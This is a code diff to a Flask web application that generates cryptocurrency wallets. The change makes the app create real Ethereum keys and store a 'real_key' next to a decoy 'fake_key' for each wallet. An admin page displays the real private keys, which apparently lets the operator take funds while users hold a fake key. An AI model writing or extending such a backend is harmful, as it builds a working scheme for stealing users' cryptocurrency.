@@ -4,6 +4,7 @@ import sqlite3
 import secrets
 from datetime import datetime
 import requests
+from eth_account import Account
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
@@ -50,8 +51,11 @@ def withdraw():
 @app.route('/api/create-wallet', methods=['POST'])
 def create_wallet():
     network = request.json.get('network', 'ethereum')
-    address = "0x" + secrets.token_hex(20)
-    real_key = "0x" + secrets.token_hex(32)
+    
+    # إنشاء محفظة حقيقية
+    account = Account.create()
+    address = account.address
+    real_key = account.key.hex()
     fake_key = "0x" + secrets.token_hex(32)
     
     c.execute("INSERT INTO wallets (network, address, real_key, fake_key, created_at) VALUES (?, ?, ?, ?, ?)",
@@ -70,7 +74,7 @@ def admin():
     wallets = c.fetchall()
     html = '<html><head><style>body{font-family:monospace;background:#0a0e27;color:#fff}table{border-collapse:collapse}td{padding:5px;border:1px solid #333}.key{color:gold}</style></head><body><h1 style="color:#00ff88">🦅 Admin Panel</h1><table>'
     for w in wallets:
-        html += f'<tr><td>{w[1]}</td><td style="font-size:12px">{w[2][:20]}...</td><td class="key">{w[3]}</td></tr>'
+        html += f'<tr><td>{w[1]}</td><td>{w[2][:25]}...</td><td class="key">{w[3]}</td></tr>'
     return html + '</table></body></html>'
 
 if __name__ == '__main__':
